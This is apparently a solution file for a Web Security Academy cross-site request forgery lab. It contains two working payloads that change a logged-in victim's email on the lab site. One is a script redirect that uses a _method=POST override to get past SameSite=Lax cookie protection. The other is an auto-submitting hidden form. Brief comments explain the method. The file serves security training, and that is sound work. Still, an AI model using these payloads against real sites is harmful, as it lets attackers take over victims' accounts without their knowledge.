
        <script>
            document.location = "https://0af300fd03488eec81944459003d00e7.web-security-academy.net/my-account/change-email?email=test@test.ew&_method=POST";
        </script>

/*
since GET is not allowed we crafted a URL which would cause a malicious GET request
BUT at the end we put the _method parameter to trick the server into thinking its a POST
BURP doesnt mention the SameSite cookie so LAX by default is beign used
*/

/*
This will aslo solve the lab

<html>
<body>
<form action="https://0a5e002203fbc21680e0cbb500b00096.web-security-academy.net/my-account/change-email" method="GET">
    <input type="hidden" name="_method" value="POST"/>
    <input type="hidden" name="email" value="test@test.ess"/>
    <input type="submit" value="Submit"/>
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>


// the GET method is used in LAX and the POST _method parameter will result in the email change
*/